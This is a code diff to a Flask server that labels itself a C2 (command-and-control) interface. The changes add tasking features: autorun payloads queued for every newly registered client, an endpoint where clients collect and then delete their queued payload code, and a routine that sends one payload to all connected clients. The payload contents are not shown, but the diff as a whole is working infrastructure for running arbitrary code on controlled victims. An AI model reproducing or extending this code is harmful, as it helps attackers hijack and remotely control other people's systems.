@@ -422,14 +422,6 @@ class ClientPayloadJob(db.Model):
 
 
 
-class AutoRunPayloadJob(db.Model):
-    id          = db.Column(db.Integer, primary_key=True)
-    code        = db.Column(db.Text, nullable=False)
-
-    def __repr__(self):
-        return f'<AutoRunPayloadJob {self.id}>'
-
-
 # User C2 UI session
 class User(UserMixin, db.Model):
     __table_name__ = 'user'
@@ -776,10 +768,38 @@ def returnUUID():
     
     threadLock.release()
 
+    # Add any autorun payloads for this client
+    payloads = CustomPayload.query.filter_by(autorun=True)
+    client   = Client.query.filter_by(uuid=token).first()
+
+    for payload in payloads:
+        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
+        db.session.add(newJob)
+    dbCommit()
 
     uuidData = {'clientToken':token}
 
     return jsonify(uuidData)
+
+
+
+# Check for custom payload jobs for the client
+@app.route('/client/taskCheck/<identifier>', methods=['GET'])
+def returnPayloads(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    client   = Client.query.filter_by(uuid=identifier).first()
+    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id)
+
+    taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]
+
+    for payload in payloads:
+        db.session.delete(payload)
+        dbCommit()
+
+    return jsonify(taskedPayloads)
+
 
 
 
@@ -1621,6 +1641,13 @@ def setPayloadAutorun():
 def runPayloadAllClients(key):
     payload = CustomPayload.query.filter_by(id=key).first()
 
+    clients = Client.query.all()
+
+    for client in clients:
+        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
+        db.session.add(newJob)
+
+    dbCommit()
 
     return "ok", 200
 
@@ -1728,7 +1755,6 @@ if __name__ == '__main__':
                     FetchHeader.__table__.drop(db.engine)
                     FetchCall.__table__.drop(db.engine)
                     Event.__table__.drop(db.engine)
-                    CustomPayload.__table__.drop(db.engine)
                     dbCommit()
 
                     db.create_all()
